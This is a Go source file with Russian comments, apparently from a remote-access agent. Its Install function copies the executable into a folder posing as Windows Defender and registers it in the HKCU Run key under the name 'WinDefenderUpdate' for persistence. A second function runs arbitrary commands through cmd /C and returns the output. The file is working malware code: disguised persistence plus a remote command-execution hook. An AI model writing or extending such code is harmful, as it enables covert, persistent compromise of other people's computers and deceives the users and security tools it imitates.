package main

import (
	"os"
	"os/exec"
	"path/filepath"
)

// Install копирует агент в скрытую папку и ставит в автозагрузку
func Install(targetName string) {
	// 1. Получаем путь, откуда мы запущены сейчас
	selfPath, err := os.Executable()
	if err != nil {
		return
	}

	appData := os.Getenv("APPDATA")
	// Путь: AppData/Roaming/Microsoft/Windows/Defender
	targetDir := filepath.Join(appData, "Microsoft", "Windows", "Defender")
	targetPath := filepath.Join(targetDir, targetName)

	// Создаем папку, если её нет
	_ = os.MkdirAll(targetDir, 0755)

	// Проверяем, не запущены ли мы уже из целевой папки
	if filepath.Clean(selfPath) != filepath.Clean(targetPath) {
		// Читаем текущий файл (даже если он переименован)
		input, err := os.ReadFile(selfPath)
		if err != nil {
			return
		}

		// Записываем себя по новому пути с правильным именем
		err = os.WriteFile(targetPath, input, 0755)
		if err != nil {
			return
		}

		// Добавляем в автозагрузку реестра
		regKey := "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
		_ = exec.Command("reg", "add", regKey, "/v", "WinDefenderUpdate", "/t", "REG_SZ", "/d", targetPath, "/f").Run()

		// Запускаем копию
		_ = exec.Command(targetPath).Start()

		// Завершаем текущий временный процесс
		os.Exit(0)
	}
}

// ExecuteSystemCommand выполняет команды в CMD
func ExecuteSystemCommand(command string) string {
	cmd := exec.Command("cmd", "/C", command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "Ошибка: " + err.Error()
	}
	return string(out)
}
